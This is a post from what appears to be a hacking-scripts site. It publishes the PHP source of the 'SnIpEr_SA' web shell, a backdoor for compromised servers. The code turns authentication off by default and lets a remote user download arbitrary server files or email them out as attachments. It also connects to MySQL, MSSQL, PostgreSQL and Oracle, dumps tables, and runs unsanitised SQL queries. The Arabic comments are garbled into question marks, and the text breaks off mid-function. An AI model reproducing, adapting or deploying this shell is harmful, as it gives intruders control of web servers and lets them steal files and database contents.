---
id: 178
title: SnIpEr_SA Shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=178
permalink: /sniper_sa-shell/
categories:
  - PHP
tags:
  - PHP
  - Sniper-SA
---
(c)oded by SnIpEr_SA

## SnIpEr_SA Shell Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
/******************************************************************************************************/
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by SnIpEr_SA
/*  MAIL http://sniper-sa.com , http://sniper-sa.com
/******************************************************************************************************/
/* ~~~ ???????? | Options  ~~~ */
// ????? | Language
// $language='eng' - english (english)
// $language='ar' - arabi (arabi)
$language='ar';
// ?????????????? | Authentification
// $auth = 1; - ?????? ?????? ????? ??????  ( authentification = On  )
// $auth = 0; - ?????? ?????? ????? ?????? ( authentification = Off )
$auth = 0;
// ????? ????? ???? ???? ?????? (Login & Password for access)
// ?????? ??????? ?? ???? ???? ??? ??????!!! (CHANGE THIS!!!)
// ??? ???? ???? ?????? ??? ????? ????? md5, ?????? ?????? ??? ??  'sniper'
// ??????? ?? ???? ???? ????? ???? ???????? ????? md5 ?????? ?? ??????? ???????
$name='1c27680133b781cadd037e8a6dcc001b'; // ??? ????????  (user login)
$pass='1c27680133b781cadd037e8a6dcc001b'; // ???? ?????? (user password)
/******************************************************************************************************/
echo "".htmlspecialchars($copy)."";
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = '1.31';
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 $_COOKIE = &$HTTP_COOKIE_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=&gt;$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_COOKIE as $k=&gt;$v)
  {
  $_COOKIE[$k] = stripslashes($v);
  }
 }
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="SnIpEr_SA shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("&lt;b&gt;&lt;a href=http://sniper-sa.com&gt;SnIpEr_SA&lt;/a&gt; : Access Denied&lt;/b&gt;");
   }
}
$head = '&lt;!-- SnIpEr_SA --&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Language" content="ar-sa"&gt;
&lt;meta name="GENERATOR" content="Microsoft FrontPage 6.0"&gt;
&lt;meta name="ProgId" content="FrontPage.Editor.Document"&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1256"&gt;
&lt;title&gt;SnIpEr_SA shell&lt;/title&gt;

&lt;STYLE&gt;
BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}
tr {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #cccccc;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #cccccc;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #cccccc;
}
input {
BORDER-RIGHT:  #990000 1 solid;
BORDER-TOP:    #990000 1 solid;
BORDER-LEFT:   #990000 1 solid;
BORDER-BOTTOM: #990000 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #CCCCCC;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #cccccc;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #cccccc;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
&lt;/STYLE&gt;
&lt;script language=\'javascript\'&gt;
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
&lt;/script&gt;';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] &lt; 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) &lt;&lt; 25) | ($timearray['mon'] &lt;&lt; 21) | ($timearray['mday'] &lt;&lt; 16) |
                ($timearray['hours'] &lt;&lt; 11) | ($timearray['minutes'] &lt;&lt; 5) | ($timearray['seconds'] &gt;&gt; 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this-&gt;unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -&gt; datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -&gt; old_offset );
        $this -&gt; old_offset += strlen($fr);
        $cdrec .= $name;
        $this -&gt; ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -&gt; datasec);
        $ctrldir = implode('', $this -&gt; ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -&gt; eof_ctrl_dir .
            pack('v', sizeof($this -&gt; ctrl_dir)) .
            pack('v', sizeof($this -&gt; ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
             $filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -&gt; addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -&gt; file();
     }
     else
     {
             $mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;
 function connect()
  {
          switch($this-&gt;db)
     {
           case 'MySQL':
            if(empty($this-&gt;port)) { $this-&gt;port = '3306'; }
            if(!function_exists('mysql_connect')) return 0;
            $this-&gt;connection = @mysql_connect($this-&gt;host.':'.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
            if(is_resource($this-&gt;connection)) return 1;
           break;
     case 'MSSQL':
      if(empty($this-&gt;port)) { $this-&gt;port = '1433'; }
            if(!function_exists('mssql_connect')) return 0;
            $this-&gt;connection = @mssql_connect($this-&gt;host.','.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
      if($this-&gt;connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this-&gt;port)) { $this-&gt;port = '5432'; }
      $str = "host='".$this-&gt;host."' port='".$this-&gt;port."' user='".$this-&gt;user."' password='".$this-&gt;pass."' dbname='".$this-&gt;base."'";
      if(!function_exists('pg_connect')) return 0;
      $this-&gt;connection = @pg_connect($str);
      if(is_resource($this-&gt;connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this-&gt;connection = @ocilogon($this-&gt;user, $this-&gt;pass, $this-&gt;base);
      if(is_resource($this-&gt;connection)) return 1;
     break;
     }
    return 0;
  }
 function select_db()
  {
   switch($this-&gt;db)
    {
          case 'MySQL':
           if(@mysql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
    break;
    case 'MSSQL':
           if(@mssql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }
 function query($query)
  {
   $this-&gt;res=$this-&gt;error='';
   switch($this-&gt;db)
    {
          case 'MySQL':
     if(false===($this-&gt;res=@mysql_query('/*'.chr(0).'*/'.$query,$this-&gt;connection)))
      {
      $this-&gt;error = @mysql_error($this-&gt;connection);
      return 0;
      }
     else if(is_resource($this-&gt;res)) { return 1; }
     return 2;
          break;
    case 'MSSQL':
     if(false===($this-&gt;res=@mssql_query($query,$this-&gt;connection)))
      {
      $this-&gt;error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this-&gt;res) &gt; 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this-&gt;res=@pg_query($this-&gt;connection,$query)))
      {
      $this-&gt;error = @pg_last_error($this-&gt;connection);
      return 0;
      }
      else if(@pg_num_rows($this-&gt;res) &gt; 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this-&gt;res=@ociparse($this-&gt;connection,$query)))
      {
      $this-&gt;error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this-&gt;res))
       {
       if(@ocirowcount($this-&gt;res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this-&gt;error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this-&gt;rows=array();
   $this-&gt;columns=array();
   $this-&gt;num_rows=$this-&gt;num_fields=0;
   switch($this-&gt;db)
    {
          case 'MySQL':
           $this-&gt;num_rows=@mysql_num_rows($this-&gt;res);
           $this-&gt;num_fields=@mysql_num_fields($this-&gt;res);
           while(false !== ($this-&gt;rows[] = @mysql_fetch_assoc($this-&gt;res)));
           @mysql_free_result($this-&gt;res);
           if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    case 'MSSQL':
           $this-&gt;num_rows=@mssql_num_rows($this-&gt;res);
           $this-&gt;num_fields=@mssql_num_fields($this-&gt;res);
           while(false !== ($this-&gt;rows[] = @mssql_fetch_assoc($this-&gt;res)));
           @mssql_free_result($this-&gt;res);
           if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;};
    break;
    case 'PostgreSQL':
           $this-&gt;num_rows=@pg_num_rows($this-&gt;res);
           $this-&gt;num_fields=@pg_num_fields($this-&gt;res);
           while(false !== ($this-&gt;rows[] = @pg_fetch_assoc($this-&gt;res)));
           @pg_free_result($this-&gt;res);
           if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    case 'Oracle':
     $this-&gt;num_fields=@ocinumcols($this-&gt;res);
     while(false !== ($this-&gt;rows[] = @oci_fetch_assoc($this-&gt;res))) $this-&gt;num_rows++;
     @ocifreestatement($this-&gt;res);
     if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this-&gt;dump=array();
   $this-&gt;dump[0] = '##';
   $this-&gt;dump[1] = '## --------------------------------------- ';
   $this-&gt;dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this-&gt;dump[3] = '## Database: '.$this-&gt;base;
   $this-&gt;dump[4] = '##    Table: '.$table;
   $this-&gt;dump[5] = '## --------------------------------------- ';
   switch($this-&gt;db)
    {
          case 'MySQL':
           $this-&gt;dump[0] = '## MySQL dump';
           if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
           if(!$this-&gt;get_result()) return 0;
           $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
     $this-&gt;dump[] = '## --------------------------------------- ';
           if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
           if(!$this-&gt;get_result()) return 0;
           for($i=0;$i&lt;$this-&gt;num_rows;$i++)
            {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
            $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
            }
    break;
    case 'MSSQL':
     $this-&gt;dump[0] = '## MSSQL dump';
     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
           if(!$this-&gt;get_result()) return 0;
           for($i=0;$i&lt;$this-&gt;num_rows;$i++)
            {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
            $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
            }
    break;
    case 'PostgreSQL':
     $this-&gt;dump[0] = '## PostgreSQL dump';
     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
           if(!$this-&gt;get_result()) return 0;
           for($i=0;$i&lt;$this-&gt;num_rows;$i++)
            {
      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
            $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
            }
    break;
    case 'Oracle':
      $this-&gt;dump[0] = '## ORACLE dump';
      $this-&gt;dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this-&gt;db)
    {
          case 'MySQL':
           @mysql_close($this-&gt;connection);
    break;
    case 'MSSQL':
     @mssql_close($this-&gt;connection);
    break;
    case 'PostgreSQL':
     @pg_close($this-&gt;connection);
    break;
    case 'Oracle':
     @oci_close($this-&gt;connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this-&gt;db)
    {
          case 'MySQL':
           return @mysql_affected_rows($this-&gt;res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this-&gt;res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this-&gt;res);
    break;
    case 'Oracle':
     return @ocirowcount($this-&gt;res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { err(1,$_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
if(isset($_GET['sqlman'])) {
session_start();
$action = $HTTP_GET_VARS['action'];
$pagemax=20; // Maximum rows displaed per page, change to display more or less rows per page.
function show_login($dbnamearray){
     $hostdefault="localhost";
                echo"&lt;table&gt;";
                echo"&lt;form  name='showlogin' method='post' action='$action'&gt;";
        if(count($hostdefault) &gt; 1){
            echo"&lt;tr&gt;&lt;td&gt;??? C???????:&lt;/td&gt;&lt;td&gt;&lt;select name=host&gt;";
            for($x=0; $x &lt; count($hostdefault);$x++){
                echo"&lt;option value=$hostdefault[$x]&gt;$hostdefault[$x]";
            }
            echo"&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;\n";
        }else{
            echo"&lt;tr&gt;&lt;td&gt;????? ????? ????????:&lt;/td&gt;&lt;td&gt;&lt;input type=text name='host' size=15 value=$hostdefault /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
                }
        echo"&lt;tr&gt;&lt;td&gt;??? ????????:&lt;/td&gt;&lt;td&gt;&lt;input type=text name='userid' size=15 /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
                echo"&lt;tr&gt;&lt;td&gt;???? ??????:&lt;/td&gt;&lt;td&gt;&lt;input type=password name='pword1' size=15 /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
                If($dbnamearray != ""){
                        echo"&lt;tr&gt;&lt;td&gt;?C?IE C?E?C?CE:&lt;/td&gt;&lt;td&gt;&lt;select name='dbna'&gt;\n";
                        for ($i =0; $i &lt; count($dbnamearray); $i++) {
                                $dbn=$dbnamearray[$i];
                                echo"&lt;option value=$dbn&gt;$dbn";
                        }
                }
                echo"&lt;tr&gt;&lt;td&gt;&lt;input class=ser type='submit' name='login' value='????' /&gt;&lt;/td&gt;\n";
                echo"&lt;td&gt;&lt;input class=ser type=reset name='reset' value='???' /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
                echo"&lt;/form&gt;&lt;/table&gt;\n";
}
function dbrestrict(){
if(isset($_SESSION['user'])){
    $user=$_SESSION['user'];
    switch($user){
    //Edit these ** values. You can add more case statements.
        case '**User**':
            $dbnamearray= array('**dbname**', '**dbname2**', '**dbname**');
            break;
     //end edit values
        default:
            $_SESSION['defaltuser']=true;
            $dbnamearray = array();
            $link = connectmysql();
            $db_list = mysql_list_dbs($link); //$db_list
                    $cnt = mysql_num_rows($db_list);
                    for ($i =0; $i &lt; $cnt; $i++) {
                            $dbnamearray[$i]= mysql_db_name($db_list, $i);
                    }
    }
    return $dbnamearray;
}
}
//***************************************************************
//function showdbs($dbnamearray, $backuppath){
function showdbs($dbnamearray){
    //$backuppath=addslashes($backuppath);
       echo"&lt;table&gt;\n";
       for ($i =0; $i &lt; count($dbnamearray); $i++) {
                    echo"&lt;tr&gt;&lt;td&gt;";
            $dbn=$dbnamearray[$i];
                        $va="?????? ??? ????? $dbn";
                        goto(' ', $dbn,$action, 'but', 'db', $va );
            $dbs=mysize($dbnamearray[$i],"");
            echo"&lt;/td&gt;&lt;td&gt;$dbs&lt;/td&gt;&lt;/tr&gt;\n";
        }
    echo"&lt;/table&gt;\n";
}

//********************* Show Logout Button **********
function endsess(){
echo"&lt;form method='post' name='endsess' action='$action'&gt;\n";
echo"&lt;input class=ser type='submit' name='logout' value='????' /&gt;\n";
echo"&lt;/form&gt;";
}
//********************************************************************
function connectmysql(){
        //Connects to the MySQL Database.

        if (isset($_SESSION['user']) && isset($_SESSION['password'])){
                 $user = $_SESSION['user'];
                 $pass = $_SESSION['password'];
        }else{
        display_foot();
        echo"\n&lt;/body&gt;\n&lt;/html&gt;";
                exit();
        }
        $link = @mysql_connect($_SESSION['host'], $_SESSION['user'], $_SESSION['password']);
        if(! $link){
                echo"&lt;div class='error'&gt;\n";
                echo"Unable to connect to the database server. &lt;BR&gt;";
                echo"The Host: $_SESSION[host], ??? ????????: $user ?? ?????? ?????? ????. &lt;br&gt;";
                echo"????? ??? ???? ???????? ??? ????.\n";
                echo"&lt;/div&gt;\n";
        return false;
                exit();
        } else{
                return $link;
        }
}
//*********************************************************************
function connectdb($db, $link){
        if(! mysql_select_db($db,$link)){
                echo"Unable to locate database $db.&lt;br&gt; Please try again later.\n";
                exit();
        }
}
//*********************************************************************
function exequery($sql, $tablename, $db){
        $result= @mysql_query( $sql );
        if($result){
                //echo "Query successful";
                return $result;
        }else{
                echo"Sorry your Query failed: $sql &lt;br&gt; error:".mysql_error()."\n";
                return false;
        }
}

//***************************************************
$fieldtypes = array("BIGINT", "BLOB", "CHAR", "DATE", "DATETIME", "DECIMAL", "DOUBLE", "ENUM", "FLOAT",
  "INT", "INTEGER", "LONGBLOB", "LONGTEXT", "MEDIUMBLOB", "MEDIUMINT", "MEDIUMTEXT", "NUMERIC", "PRECISION",
 "REAL","SET", "SMALLINT", "TEXT", "TIME", "TIMESTAMP", "TINYBLOB", "TINYINT", "TINYTEXT", "VARCHAR", "YEAR" );

//****************** Search Form ****************************
function searchtableform($tablename, $dbname){
        echo"&lt;form method='post' action='$action'&gt;\n";
        echo"&lt;input type=hidden name='dbname' value='$dbname' /&gt;\n";
        echo"&lt;input type=hidden name='tablename' value='$tablename' /&gt;\n";
        echo"&lt;input type=text name='searchval' /&gt;\n";
        echo"&lt;input class=ser type=submit name='search' value='Search $tablename' /&gt;\n";
        echo"&lt;/form&gt;\n";
}
//********************* Search *************************
function searcht($tablename, $dbname, $searchval){
        if(! empty($searchval)){
                //        $searchval= str_replace(";",' ', $searchval);
        $result=exequery("Select * from $tablename", $tablename, $dbname);
                //$result=mysql_query("Select * from $tablename");
                $num = mysql_num_fields($result);
                $fields = mysql_list_fields($dbname, $tablename);
                $whr="where ";
                $tok=explode(" ",$searchval);
                for ($t =0; $t &lt; count($tok); $t++){
                        for ( $c = 0; $c &lt; $num; $c++){
                                $fn =mysql_field_name($fields, $c);
                                $whr .=" $fn like '%$tok[$t]%' or ";
                        }
                }
                $whr=trim(substr_replace($whr, " ", -3));
                $query="Select * from $tablename $whr";
                $result=exequery($query, $tablename, $dbname);
                return $result;
        }
}
//*********************GOTO buttons*************************
//provides a form and button.
function goto($tablename, $dbname, $action, $class, $name, $va ){
        //Adds a button.
        echo"&lt;form action='$action' method='post' &gt;\n";
                if(! eregi('tablestart', $name)){
                        echo"&lt;input type=hidden name=dbname value='$dbname' /&gt;\n";
                        echo"&lt;input type=hidden name=tablename value='$tablename' /&gt;\n";
                }
                echo"&lt;input class=$class type=submit  value='$va' name='$name' /&gt;\n";
                //echo"&lt;input class=$class type=submit  value='$action' name=$name&gt;";
        echo"&lt;/form&gt;\n";
        //echo"&lt;a class=$class href=$action&gt;$va&lt;/a&gt;";
        //}
}
//*********************** ShowDB ***********************************
function showdb(){
//function showdb($backuppath){
        $link=connectmysql();
        if ($link){
        echo"&lt;div class='db'&gt;";
                echo"&lt;div class='cream'&gt;\n";
                echo"&lt;h2 class=h &gt;????? ????? ?????&lt;/h2&gt;\n";
                echo"&lt;form name=cdb action='$action' method='post' &gt;\n";
                echo"??? ??????? ???????: &lt;input type=text name=ndbname /&gt;\n";
                echo"&lt;br /&gt;&lt;br /&gt;&lt;input class=but type='submit' name='cndb' value='????? ????? ?????' /&gt;\n";
                echo"&lt;/form&gt;&lt;br /&gt;";
                echo"&lt;/div&gt;";
                echo"&lt;h2 class=h &gt;????? ??????? ????????&lt;/h2&gt;\n";
                //Restrict the database for users
        $dbnamearray= dbrestrict();
        showdbs($dbnamearray);
        echo"&lt;/div&gt;";
           }
}
//********************** BuildWhr ******************************
//Builds the Where part of queries.
function buildwhr($pk, $pv){
        $whr="";
        $pn =count($pv);
        for($t =0; $t &lt; $pn; $t++){
                $whr.="$pk[$t]='$pv[$t]'";
                if($t &lt; $pn-1){
                        $whr.=" and ";
                }
        }
        if ($whr !=" "){
                return $whr;
        }else{
                return false;
        }
}
//***********************ADD Record ******************
function addrecord($tablename, $dbname, $array){
     $result=exequery("Select * from $tablename", $tablename, $dbname);
        //$result = @mysql_query( "Select * from $tablename" );
        $flds = mysql_num_fields($result);
        //$fields = mysql_list_fields($dbname, $tablename);
           $qry=" ";
    $query = "Insert into $tablename Values( ";
        for ($x =0; $x &lt; $flds; $x++){
        //Multiple Select values for SET
       if(is_array($array[$x])){
            $mval="";
            for($m=0; $m &lt; count($array[$x]); $m++){
                if($m+1 == count($array[$x])){
                    $mval.= AddSlashes($array[$x][$m]);
                }else{
                    $mval.= AddSlashes($array[$x][$m]).",";
                }
                $fval = $mval;
            }
        }else{
                    $fval = AddSlashes($array[$x]);
        }
                $qry .= "'$fval'";
                if ($x &lt; $flds-1){
                        $qry.= ", ";
                }
        }
        $query .= $qry.")";
   // echo"qry: $qry";
        $result=exequery($query, $tablename, $dbname);
        if($result){
                return $result;
        }else{
                return false;
        }
}
//**********************ADD Form **********************
function addform($tablename, $dbname){
 //Display the field names and input boxes
 echo"&lt;form action='$action' method='post'&gt;\n";
 echo"&lt;table border=0 width='100%' align='center'&gt;\n";
 echo"&lt;tr class=head&gt;&lt;td&gt;Field Name&lt;/td&gt;&lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Value&lt;/td&gt;&lt;/tr&gt;\n";
  $result=exequery("Select * from $tablename", $tablename, $dbname);
 //$result = @mysql_query( "Select * from $tablename" );
 $flds = mysql_num_fields($result);
 $fields = mysql_list_fields($dbname, $tablename);
 echo"&lt;input type=hidden name=tablename value='$tablename' /&gt;\n";
 echo"&lt;input type=hidden name='dbname' value='$dbname' /&gt;\n";
 echo"&lt;tr&gt;\n";
 $mxlen = 80;//max width of the form fields.
 for($i=0; $i &lt; $flds; $i++){
      $auto = "false";
      echo "&lt;th&gt;".mysql_field_name($fields, $i);
      $fieldname = mysql_field_name($fields, $i);  // added
      $type  = mysql_field_type($result, $i);
      $flen = mysql_field_len($result, $i);//length of the field
      $flagstring = mysql_field_flags ($result, $i);
    // Start of new code for set drop down
      $newsql = "show columns from $tablename like '%".$fieldname."'";
      $newresult = exequery($newsql, $tablename, $dbname);
      //mysql_query($newsql) or die ('I cannot get the query because: ' . mysql_error());
      $arr=mysql_fetch_array($newresult);
    // End of new code block for set drop down
      if (eregi("primary",$flagstring )){
       $type .= " PK ";
      }
      if(eregi("auto",$flagstring )){
       $type .= " auto_increment";
       $auto = "true";
      }
      if ($auto=="true"){
        echo"&lt;td&gt;$type&lt;/td&gt;&lt;td&gt;&lt;input type=text name='array[$i]' size='$flen' value=0 /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
      }elseif($flen &gt; $mxlen){
        $rws= $flen/$mxlen;
        if($rws&gt;10){
             $rws=10; //max length of textarea
        }
        echo"&lt;td&gt;$type&lt;/td&gt;&lt;td&gt;&lt;textarea name='array[$i]' rows=$rws cols=$mxlen&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\n";
        // Start of new code for set drop down
      }elseif (strncmp($arr[1],'set',3)==0 || strncmp($arr[1],'enum',4)==0){  // We have a field type of set or enum
       $num=substr_count($arr[1],',') + 1;  // count the number of entries
       $pos=strpos($arr[1],'(' ); //find the position of '('
